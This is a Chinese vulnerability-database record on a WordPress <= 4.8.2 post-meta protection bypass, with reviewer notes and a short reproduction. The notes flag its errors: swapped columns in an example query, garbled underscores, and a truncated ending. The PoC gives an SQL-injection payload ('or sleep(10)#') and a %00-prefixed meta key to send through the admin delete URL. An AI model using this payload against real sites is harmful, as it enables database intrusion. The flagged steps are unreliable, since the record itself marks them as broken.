---
source: "hatch 补库批 20260928"
product: "WordPress core"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Wordpress <= 4.8.2 POST META 校验绕过漏洞"
prerequisites: "来源所述条件，未列明部分仍待核：<=4.8.2 title; authenticated custom-meta edit and delete nonce; MySQL collation treats NUL prefix equivalently; downstream formatter vulnerable"
side_effects: "未执行；本文需注意的操作影响：元数据写绕过与后续格式化 SQLi 是两个缺陷阶段；需要已认证编辑能力、delete nonce、排序规则等前提。结尾截为“参”的来源段保留截断事实，不据此恢复未知正文。"
source_status: "unknown"
id: "vw-768b098f5737636eac08a9da"
entity_id: "ve-768b098f5737636eac08a9da"
schema_version: "1"
---

## 核对与使用边界

- 明确更正：示例 UPDATE 的 meta_key/meta_value 与初始表列含义反了，且显示 0 rows，不能支撑随后“已经修改”的 SELECT 展示。真实代码检查下划线 `_`，不是被 Markdown 斜体化后的星号。
- 元数据写绕过与后续格式化 SQLi 是两个缺陷阶段；需要已认证编辑能力、delete nonce、排序规则等前提。结尾截为“参”的来源段保留截断事实，不据此恢复未知正文。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：&lt;=4.8.2 title; authenticated custom-meta edit and delete nonce; MySQL collation treats NUL prefix equivalently; downstream formatter vulnerable

- **结论使用边界（1）**：示范UPDATE将meta_key改为NUL+TESTC且WHERE meta_value='_thumbnail_id'，与初始表恰好列反了，并返回0rows；不能支撑之后已修改的SELECT展示。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **结论使用边界（2）**：文字把下划线变成斜体*，称首字符以*开头错误，真实代码检查_。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **代码与转录边界（3）**：结尾只剩参，参考/后续内容截断；payloadURL中的空格/#未编码说明不足。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **适用与权限边界（4）**：需分清元数据写绕过和后续SQLi两个缺陷及权限，未给原始来源/修复。按此限制解释本文结论，版本相同不足以证明所需角色、入口、配置、依赖或可控参数均已满足；原操作和失败记录一并保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Wordpress \<= 4.8.2 POST META 校验绕过漏洞

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

### 一个MySQL的trick

1). 正常的条件查询语句

    mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
    +---------+---------+----------------+------------+
    | meta_id | post_id | meta_key       | meta_value |
    +---------+---------+----------------+------------+
    |       4 |       4 | _thumbnail_id  | TESTC      |
    +---------+---------+----------------+------------+
    1 row in set (0.00 sec)

2). 现在我们将\_thumbnail\_id修改成"\\x00\_thumbnail\_id"

    mysql> update wp_postmeta set meta_key = concat(0x00,'TESTC') where meta_value = '_thumbnail_id';
    Query OK, 0 rows affected (0.00 sec)
    Rows matched: 0  Changed: 0  Warnings: 0

3). 再次执行第一步的查询

    mysql> SELECT * FROM wp_postmeta WHERE meta_key = '_thumbnail_id';
    +---------+---------+----------------+------------+
    | meta_id | post_id | meta_key       | meta_value |
    +---------+---------+----------------+------------+
    |       4 |       4 |  _thumbnail_id | TESTC      |
    +---------+---------+----------------+------------+
    1 row in set (0.00 sec)

我们可以发现依然可以查询出修改后的数据。

### POST META 校验绕过

我们来看下检查meta\_key的代码，文件./wp-includes/meta.php：

    function is_protected_meta( $meta_key, $meta_type = null ) {
        $protected = ( '_' == $meta_key[0] );
        /**
         * Filters whether a meta key is protected.
         *
         * [@since](/since) 3.2.0
         *
         * [@param](/param) bool   $protected Whether the key is protected. Default false.
         * [@param](/param) string $meta_key  Meta key.
         * [@param](/param) string $meta_type Meta type.
         */
        return apply_filters( 'is_protected_meta', $protected, $meta_key, $meta_type );
    }

is*protected\_meta函数只检查了\$meta\_key的第一个字符是否以*开头。我们有了2.1的MySQL
trick，想要绕过meta\_key的检查就显得容易多了。

### poc

    添加自定义字段，meta_key为’_thumbnail_id’的meta_value为’55 %1$%s or sleep(10)#’
    在添加自定义栏目/字段时抓包，将_thumbnail_id替换为%00_thumbnail_id
    访问/wp-admin/edit.php?action=delete&_wpnonce=xxx&ids=55 %1$%s or sleep(10)#，触发SQL注入漏洞
    参
